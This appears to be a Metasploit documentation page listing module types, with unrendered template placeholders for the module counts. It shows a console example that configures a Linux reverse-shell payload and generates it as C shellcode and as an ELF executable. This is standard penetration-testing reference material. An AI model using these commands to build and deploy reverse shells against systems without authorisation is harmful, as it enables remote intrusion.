## Metasploit modules
## Module types
### Auxiliary modules ({{ site.metasploit_module_counts["auxiliary"] }})
### Encoder modules ({{ site.metasploit_module_counts["encoder"] }})
### Evasion modules ({{ site.metasploit_module_counts["evasion"] }})
### Exploit modules ({{ site.metasploit_module_counts["exploit"] }})
### Nop modules ({{ site.metasploit_module_counts["nop"] }})
### Payloads modules ({{ site.metasploit_module_counts["payload"] }})
Payload modules can also be used individually to generate standalone executables, or shellcode for use within exploits:
```msf
msf6 payload(linux/x86/shell_reverse_tcp) > back
msf6 > use payload/linux/x86/shell_reverse_tcp
msf6 payload(linux/x86/shell_reverse_tcp) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf6 payload(linux/x86/shell_reverse_tcp) > set lport 4444
lport => 4444

# Generate a payload for use within C
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f c

# Generate an ELF file for execution on Linux environments
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell
```

